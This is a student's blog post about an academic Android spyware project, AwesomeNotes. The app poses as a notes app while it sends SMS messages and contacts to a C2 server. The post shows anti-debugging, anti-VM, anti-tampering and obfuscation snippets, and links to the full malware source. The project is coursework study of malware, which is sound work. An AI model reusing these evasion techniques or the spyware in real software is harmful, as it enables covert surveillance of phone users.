<!doctype html><html lang=en-us><head><title>The homemade Pegasus [EN] // Javier Rodr√≠guez</title><link rel="shortcut icon" href=/favicon.ico><meta charset=utf-8><meta name=generator content="Hugo 0.100.1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="Javier Rodriguez Campo"><meta name=description content><link rel=stylesheet href=https://jrcampo.com/css/main.min.4c90ea63ff8730316d9dd2a0d1670b768d778c8c6622fe9c0adce2c9fb0e3a01.css><meta name=twitter:card content="summary"><meta name=twitter:title content="The homemade Pegasus [EN]"><meta name=twitter:description content="Introduction üîç In the last few months, the growing trend of spyware 1 and the report 2 of socially recognized and famous victims made that the word &ldquo;Pegasus&rdquo; appears in our conversations with friends over coffee or on the front pages of the media.
But, what is Pegasus? Basically, is a spyware that can infiltrate a device and harvest personal and location data, control the phone&rsquo;s microphones and cameras without the user&rsquo;s knowledge or permission."><meta property="og:title" content="The homemade Pegasus [EN]"><meta property="og:description" content="Introduction üîç In the last few months, the growing trend of spyware 1 and the report 2 of socially recognized and famous victims made that the word &ldquo;Pegasus&rdquo; appears in our conversations with friends over coffee or on the front pages of the media.
But, what is Pegasus? Basically, is a spyware that can infiltrate a device and harvest personal and location data, control the phone&rsquo;s microphones and cameras without the user&rsquo;s knowledge or permission."><meta property="og:type" content="article"><meta property="og:url" content="https://jrcampo.com/posts/spyware-post/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-06-02T17:03:28+02:00"><meta property="article:modified_time" content="2022-06-02T17:03:28+02:00"></head><body><header class=app-header><a href=https://jrcampo.com/><img class=app-header-avatar src=/curriculum.png alt="Javier Rodriguez Campo"></a><h1>Javier Rodr√≠guez</h1><nav class=app-header-menu><a class=app-header-menu-item href=/about/>About Me</a>
|
<a class=app-header-menu-item href=/posts/>Posts</a>
|
<a class=app-header-menu-item href=/social/>Social Media</a></nav><p>MSc Cibersecurity Student</p><div class=app-header-social><a href=https://linkedin.com/in/jrcampo target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin"><title>LinkedIn</title><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a><a href=https://twitter.com/jrodriguezz24 target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter"><title>Twitter</title><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=https://github.com/javirodriguezzz target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github"><title>Github</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></div></header><main class=app-container><article class=post><header class=post-header><h1 class=post-title>The homemade Pegasus [EN]</h1><div class=post-meta><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Jun 2, 2022</div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>3 min read</div></div></header><div class=post-content><style>p{text-align:justify}li{text-align:justify}img{width:30%;height:30%;display:block;margin:auto}tbody{border-collapse:collapse;border:2px #29f3c3}</style><h3 id=introduction->Introduction üîç</h3><p>In the last few months, the growing trend of spyware <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup> and the report <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> of socially recognized and famous victims made that the word &ldquo;<em>Pegasus</em>&rdquo; appears in our conversations with friends over coffee or on the front pages of the media.</p><p>But, what is <em>Pegasus</em>? Basically, is a spyware that can infiltrate a device and harvest personal and location data, control the phone&rsquo;s microphones and cameras without the user&rsquo;s knowledge or permission. This tool was made by the Israeli technology company NSO Group, and several reports informs that it affected heads of state including Emmanuel Macron (France), Pedro S√°nchez (Spain), the South African President Cyril Ramaphosa among others. But the best known case could be called that of Jeff Bezos mobile infection, which is explained in detail in the following video of the cybersecurity content creator <a href=https://www.linkedin.com/in/s4vitar/>Marcelo V√°zquez (aka. s4vitar)</a>.</p><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe src=https://www.youtube.com/embed/rABIDoDKGB0 style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 allowfullscreen title="YouTube Video"></iframe></div><h3 id=so-what-we-do->¬øSo, what we do? üíª</h3><p>Due to the above arguments, combined with the proposal of the design of a malicious app for Android 8.1 in a subject of our MSc, we decided to create an ostensibly apk for the creation and management of notes. We called it <em>AwesomeNotes</em>, but its hidden features go much further than previously described&mldr;</p><p><img src=/awesome-notes.jpeg alt=AwesomeNotes title="AwesomeNotes app"></p><p>The app collects private information from our devices such SMS, contact numbers among other data and sends it to a C2 server over HTTPS. It&rsquo;s a sophisticated application due to the protection measures implemented on it to avoid analysis through the application of reverse engineering. Among them the following stand out:</p><ul><li>Anti-debugging.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Anti-debugging check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>boolean</span> isBeingDebugged <span style=color:#f92672>=</span> android<span style=color:#f92672>.</span><span style=color:#a6e22e>os</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Debug</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isDebuggerConnected</span><span style=color:#f92672>();</span>
</span></span></code></pre></div><ul><li>Anti-backup.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Anti-backup check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>boolean</span> isBackupAllowed <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>getApplicationInfo<span style=color:#f92672>().</span><span style=color:#a6e22e>flags</span> <span style=color:#f92672>&amp;</span> ApplicationInfo<span style=color:#f92672>.</span><span style=color:#a6e22e>FLAG_ALLOW_BACKUP</span><span style=color:#f92672>)</span> <span style=color:#f92672>!=</span> 0<span style=color:#f92672>;</span>
</span></span></code></pre></div><ul><li>Anti-tampering.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Anti-Tampering
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>CRC32 crc <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> CRC32<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>crc<span style=color:#f92672>.</span><span style=color:#a6e22e>update</span><span style=color:#f92672>(</span>bytes<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>boolean</span> isTampered <span style=color:#f92672>=</span> crc<span style=color:#f92672>.</span><span style=color:#a6e22e>getValue</span><span style=color:#f92672>()</span> <span style=color:#f92672>!=</span> Long<span style=color:#f92672>.</span><span style=color:#a6e22e>parseLong</span><span style=color:#f92672>(</span>getString<span style=color:#f92672>(</span>R<span style=color:#f92672>.</span><span style=color:#a6e22e>string</span><span style=color:#f92672>.</span><span style=color:#a6e22e>crc</span><span style=color:#f92672>));</span>
</span></span></code></pre></div><ul><li>Code ofuscation.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>buildTypes <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    release <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Enable code optimization and obfuscation (in build.gradle)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        minifyEnabled <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>        shrinkResources <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        proguardFiles <span style=color:#a6e22e>getDefaultProguardFile</span><span style=color:#f92672>(</span><span style=color:#960050;background-color:#1e0010>&#39;</span>proguard<span style=color:#f92672>-</span>android<span style=color:#f92672>-</span>optimize<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span><span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>),</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>proguard<span style=color:#f92672>-</span>rules<span style=color:#f92672>.</span><span style=color:#a6e22e>pro</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        signingConfig signingConfigs<span style=color:#f92672>.</span><span style=color:#a6e22e>release</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><ul><li>Anti-virtualization.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Anti-VM
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    isVirtualized <span style=color:#f92672>=</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasGenyFiles</span><span style=color:#f92672>()</span> <span style=color:#f92672>||</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasEth0Interface</span><span style=color:#f92672>()</span> <span style=color:#f92672>||</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasQEmuProps</span><span style=color:#f92672>(</span>getApplicationContext<span style=color:#f92672>())</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasPipes</span><span style=color:#f92672>()</span> <span style=color:#f92672>||</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasEmulatorBuild</span><span style=color:#f92672>(</span>getApplicationContext<span style=color:#f92672>())</span> <span style=color:#f92672>||</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>isOperatorNameAndroid</span><span style=color:#f92672>(</span>getApplicationContext<span style=color:#f92672>())</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasQEmuDrivers</span><span style=color:#f92672>()</span> <span style=color:#f92672>||</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasQEmuFiles</span><span style=color:#f92672>()</span> <span style=color:#f92672>||</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasTracerPid</span><span style=color:#f92672>()</span> <span style=color:#f92672>||</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasAppAnalysisPackage</span><span style=color:#f92672>(</span>getApplicationContext<span style=color:#f92672>())</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>hasTaintClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>||</span> Utils<span style=color:#f92672>.</span><span style=color:#a6e22e>detectsensor</span><span style=color:#f92672>(</span>getApplicationContext<span style=color:#f92672>());</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Anti-analysis: VM check failed&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><ul><li>Polymorphism.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Polymorphism
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>RANDOM<span style=color:#f92672>);</span>
</span></span></code></pre></div><ul><li>Conectivity check with C2 server.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Connectivity check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>AliveAPI api <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AliveAPI<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>Integer<span style=color:#f92672>.</span><span style=color:#a6e22e>parseInt</span><span style=color:#f92672>(</span>api<span style=color:#f92672>.</span><span style=color:#a6e22e>execute</span><span style=color:#f92672>(</span>getString<span style=color:#f92672>(</span>R<span style=color:#f92672>.</span><span style=color:#a6e22e>string</span><span style=color:#f92672>.</span><span style=color:#a6e22e>c2</span><span style=color:#f92672>)</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;alive&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>get</span><span style=color:#f92672>())</span> <span style=color:#f92672>!=</span> 200<span style=color:#f92672>)</span> <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Exception<span style=color:#f92672>();</span> <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Anti-analysis: Server down&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    start <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><ul><li>Communication encryption (HTTPS using self-signed certificate).</li></ul><p>Both source code, the apk&rsquo;s with or without anti-analysis measures and the deployment instructions for the evil C2 server infraestructure are available in the following <a href=https://github.com/javirodriguezzz/awesome-notes-malware>public GitHub repository</a>.</p><h3 id=contributors>Contributors</h3><table><thead><tr><th style=text-align:center><strong>Contributor Name</strong></th><th style=text-align:center><strong>Contributions</strong></th><th style=text-align:center><strong>Socials</strong></th></tr></thead><tbody><tr><td style=text-align:center><em>David Land√≠n Calvo</em></td><td style=text-align:center>UI design, anti-analysis measures, integrity system control, communication encryption</td><td style=text-align:center><a href=https://www.linkedin.com/in/david-land%C3%ADn-calvo-528ab91a3/>LinkedIn</a> <a href=https://github.com/david-lc>GitHub</a></td></tr><tr><td style=text-align:center><em>David Soler Garc√≠a</em></td><td style=text-align:center>UI design, malicious service, <em>send</em> Endpoint</td><td style=text-align:center><a href=https://www.linkedin.com/in/david-soler-garc%C3%ADa-90b21b1a5/>LinkedIn</a> <a href=https://github.com/SDABIS>GitHub</a></td></tr><tr><td style=text-align:center><em>Javier Rodr√≠guez Campo</em></td><td style=text-align:center>Integration of anti-virtualization techniques, communication encryption</td><td style=text-align:center><a href=https://www.linkedin.com/in/jrcampo/>LinkedIn</a> <a href=https://github.com/javirodriguezzz>GitHub</a></td></tr></tbody></table><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><em>Source <a href=https://www.msspalert.com/cybersecurity-guests/stalkerware-detection-trends-monitor-and-spyware-findings/>MSSP Alert</a></em>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><em><a href=https://www.verizon.com/business/resources/reports/2020-data-breach-investigations-report.pdf>Verizon report</a></em>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div><div class=post-footer></div></article></main></body></html>